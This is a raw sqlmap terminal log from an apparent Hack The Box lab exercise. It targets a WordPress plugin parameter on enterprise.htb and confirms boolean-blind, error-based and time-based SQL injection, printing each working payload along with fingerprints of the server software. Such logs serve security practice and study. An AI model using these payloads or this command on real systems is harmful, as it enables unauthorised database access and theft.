└─$ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch               
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:49:12 /2022-12-27/

[21:49:12] [INFO] testing connection to the target URL
[21:49:12] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:49:12] [INFO] testing if the target URL content is stable
[21:49:13] [INFO] target URL content is stable
[21:49:13] [INFO] testing if GET parameter 'query' is dynamic
[21:49:13] [WARNING] GET parameter 'query' does not appear to be dynamic
[21:49:13] [WARNING] heuristic (basic) test shows that GET parameter 'query' might not be injectable
[21:49:13] [INFO] testing for SQL injection on GET parameter 'query'
[21:49:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:49:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:49:15] [INFO] GET parameter 'query' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="fatal")
[21:49:18] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:49:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:49:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:49:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:49:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:49:19] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:49:19] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:49:19] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:49:19] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:49:19] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:49:19] [INFO] GET parameter 'query' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[21:49:19] [INFO] testing 'Generic inline queries'
[21:49:20] [INFO] testing 'MySQL inline queries'
[21:49:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:49:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:49:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:49:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:49:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:49:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:49:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:49:31] [INFO] GET parameter 'query' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:49:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:49:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:49:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:49:32] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[21:49:33] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[21:49:37] [INFO] target URL appears to be UNION injectable with 1 columns
[21:49:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:49:42] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[21:49:46] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[21:49:49] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[21:49:53] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[21:49:57] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[21:50:00] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[21:50:04] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[21:50:08] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[21:50:11] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'query' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 297 HTTP(s) requests:
---
Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (1297=1297) THEN 1 ELSE (SELECT 5808 UNION SELECT 3400) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: query=1 AND (SELECT 8946 FROM(SELECT COUNT(*),CONCAT(0x71787a7071,(SELECT (ELT(8946=8946,1))),0x716a706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=1 AND (SELECT 5057 FROM (SELECT(SLEEP(5)))qmIa)
---
[21:50:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10, PHP 5.6.31
back-end DBMS: MySQL >= 5.0
[21:50:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/enterprise.htb'

[*] ending @ 21:50:16 /2022-12-27/
